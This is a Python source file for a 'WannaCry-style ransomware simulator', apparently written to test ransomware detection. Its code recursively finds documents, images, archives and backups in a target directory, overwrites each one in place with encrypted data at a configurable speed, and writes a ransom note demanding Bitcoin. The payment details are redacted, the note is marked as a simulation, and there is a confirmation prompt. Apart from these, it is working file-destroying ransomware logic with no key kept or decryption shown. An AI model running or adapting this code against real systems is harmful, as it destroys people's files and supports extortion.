"""
WannaCry-style ransomware simulator
Fast & Furious attack pattern
"""

import sys
import os
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from simulator.core.encryption import EncryptionEngine
from simulator.core.file_selector import FileSelector
from simulator.core.speed_controller import SpeedController


class WannaCrySimulator:
    """
    Simulates WannaCry-style ransomware attack
    
    Characteristics:
    - Fast encryption (500 files/second)
    - Targets all common file types
    - Recursive directory traversal
    - Leaves ransom note
    """
    
    def __init__(
        self,
        target_dir: str,
        speed: int = 500,
        encryption_algorithm: str = "aes256"
    ):
        """
        Initialize WannaCry simulator
        
        Args:
            target_dir: Directory to attack
            speed: Files per second
            encryption_algorithm: Encryption method to use
        """
        self.target_dir = Path(target_dir)
        self.speed = speed
        self.encryption_algorithm = encryption_algorithm
        
        # Target extensions (common file types)
        self.extensions = [
            '.txt', '.doc', '.docx', '.pdf', '.jpg', '.png',
            '.xlsx', '.pptx', '.zip', '.rar', '.sql', '.bak'
        ]
        
        # Initialize components
        self.encryptor = EncryptionEngine(encryption_algorithm)
        self.file_selector = FileSelector(
            target_dir=str(self.target_dir),
            extensions=self.extensions,
            recursive=True
        )
        self.speed_controller = SpeedController(speed, "second")
        
        # Statistics
        self.files_encrypted = 0
        self.files_failed = 0
        self.total_bytes_encrypted = 0
    
    def encrypt_file(self, file_path: Path) -> bool:
        """
        Encrypt a single file
        
        Args:
            file_path: Path to file to encrypt
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Track size
            self.total_bytes_encrypted += len(data)
            
            # Encrypt
            encrypted = self.encryptor.encrypt(data)
            
            # Write back
            with open(file_path, 'wb') as f:
                f.write(encrypted)
            
            print(f"[WANNACRY] ✓ Encrypted: {file_path}")
            self.files_encrypted += 1
            return True
            
        except Exception as e:
            print(f"[WANNACRY] ✗ Failed: {file_path} - {e}")
            self.files_failed += 1
            return False
    
    def leave_ransom_note(self):
        """Create ransom note in target directory"""
        note_content = """
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║           YOUR FILES HAVE BEEN ENCRYPTED!                 ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

What happened to your files?
-----------------------------
All of your important files have been encrypted using military-grade
encryption algorithms. Without our decryption key, you will never be
able to recover your files.

How to decrypt your files?
---------------------------
1. Send $300 worth of Bitcoin to the following address:
   [REDACTED - THIS IS A SIMULATION]

2. After payment, email your unique ID to: [REDACTED]

3. You will receive the decryption key within 24 hours.

⚠️  WARNING ⚠️
--------------
You have 72 hours to make the payment. After that, the decryption
key will be permanently deleted and your files will be lost forever.

Do NOT attempt to:
- Decrypt files yourself (will corrupt them permanently)
- Remove this software (will trigger file deletion)
- Contact authorities (will result in key destruction)

═══════════════════════════════════════════════════════════

THIS IS A SIMULATION FOR SECURITY TESTING PURPOSES ONLY
Files can be restored from backup

═══════════════════════════════════════════════════════════
"""
        
        note_path = self.target_dir / "README_DECRYPT.txt"
        try:
            note_path.write_text(note_content)
            print(f"[WANNACRY] Ransom note created: {note_path}")
        except Exception as e:
            print(f"[WANNACRY] Failed to create ransom note: {e}")
    
    def run(self):
        """Execute the WannaCry-style attack"""
        print("=" * 60)
        print("[WANNACRY] WannaCry-Style Ransomware Simulation")
        print("=" * 60)
        print(f"[WANNACRY] Target: {self.target_dir}")
        print(f"[WANNACRY] Speed: {self.speed} files/second")
        print(f"[WANNACRY] Encryption: {self.encryption_algorithm.upper()}")
        print("=" * 60)
        
        # Find targets
        print("[WANNACRY] Scanning for target files...")
        targets = self.file_selector.find_targets()
        print(f"[WANNACRY] Found {len(targets)} target files")
        
        if not targets:
            print("[WANNACRY] No files to encrypt. Exiting.")
            return
        
        # Start encryption
        print("[WANNACRY] Starting encryption...")
        self.speed_controller.start()
        
        for target in targets:
            self.encrypt_file(target)
            self.speed_controller.wait()
        
        # Leave ransom note
        self.leave_ransom_note()
        
        # Print statistics
        print("=" * 60)
        print("[WANNACRY] Attack Complete!")
        print("=" * 60)
        print(f"Files encrypted: {self.files_encrypted}")
        print(f"Files failed: {self.files_failed}")
        print(f"Total data encrypted: {self.total_bytes_encrypted / 1024:.2f} KB")
        print(f"Time elapsed: {self.speed_controller.get_elapsed_time():.2f} seconds")
        print(f"Actual rate: {self.speed_controller.get_actual_rate():.2f} files/second")
        print("=" * 60)


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description="WannaCry-style ransomware simulator")
    parser.add_argument("target", help="Target directory to encrypt")
    parser.add_argument("--speed", type=int, default=500, help="Files per second (default: 500)")
    parser.add_argument("--algorithm", default="fernet", choices=["fernet", "aes256", "chacha20"],
                       help="Encryption algorithm (default: fernet)")
    
    args = parser.parse_args()
    
    # Confirm before running
    print(f"\n⚠️  WARNING: This will encrypt all files in {args.target}")
    print("This is a simulation for testing purposes only.")
    response = input("Continue? (yes/no): ")
    
    if response.lower() != "yes":
        print("Aborted.")
        return
    
    # Run simulation
    sim = WannaCrySimulator(args.target, args.speed, args.algorithm)
    sim.run()


if __name__ == "__main__":
    main()
